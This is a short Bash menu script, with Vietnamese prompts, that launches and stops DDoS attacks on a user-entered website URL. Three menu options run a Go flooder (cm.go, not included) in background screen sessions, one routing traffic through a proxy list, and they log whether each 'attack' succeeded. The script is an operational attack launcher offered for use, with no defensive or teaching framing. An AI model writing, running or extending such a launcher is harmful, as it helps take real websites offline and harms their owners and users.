#!/bin/bash

# Hàm dừng tất cả các phiên screen
stop_all_screens() {
    echo "Đang dừng tất cả cuộc tấn công..."
    screen -ls | grep Detached | awk '{print $1}' | xargs -n 1 screen -S {} -X quit
    echo "Tất cả cuộc tấn công đã được dừng..."
}

# Vòng lặp menu
while true; do
    # Hiển thị menu chính
    echo "=== Menu ==="
    echo "1: Main DDos (Random Flags + HTTP Proxy)"
    echo "2: Another Method (Hardcoded Flags No Proxy)"
    echo "3: Default Method (No Flags HTTP Call)"
    echo "4: Stop all attack"
    echo "5: Exit"
    read -p "Chọn: " method

    # Xử lý lựa chọn
    case $method in
        1)
            read -p "Nhập URL: " url
            screen -dmS attack_method_1 bash -c "
                go run cm.go -site \"$url\" -heta -proxy proxy.txt -safe
                if [ $? -eq 0 ]; then
                    echo 'Attack Success (Method 1)' > attack_1.log
                else
                    echo 'Attack Failed (Method 1)' > attack_1.log
                fi
            "
            echo "Start Attack Website!"
            ;;
        2)
            read -p "Nhập URL: " url
            screen -dmS attack_method_2 bash -c "
                go run cm.go -site \"$url\" -hetb -safe
                if [ $? -eq 0 ]; then
                    echo 'Attack Success (Method 2)' > attack_2.log
                else
                    echo 'Attack Failed (Method 2)' > attack_2.log
                fi
            "
            echo "Start Attack Website!"
            ;;
        3)
            read -p "Nhập URL: " url
            screen -dmS attack_method_3 bash -c "
                go run cm.go -site \"$url\" -safe
                if [ $? -eq 0 ]; then
                    echo 'Attack Success (Method 3)' > attack_3.log
                else
                    echo 'Attack Failed (Method 3)' > attack_3.log
                fi
            "
            echo "Start Attack Website!"
            ;;
        4)
            # Dừng tất cả các phiên screen
            stop_all_screens
            ;;
        5)
            # Thoát vòng lặp
            echo "Đã Thoát"
            break
            ;;
        *)
            echo "Lựa chọn không hợp lệ"
            ;;
    esac

    echo ""
done
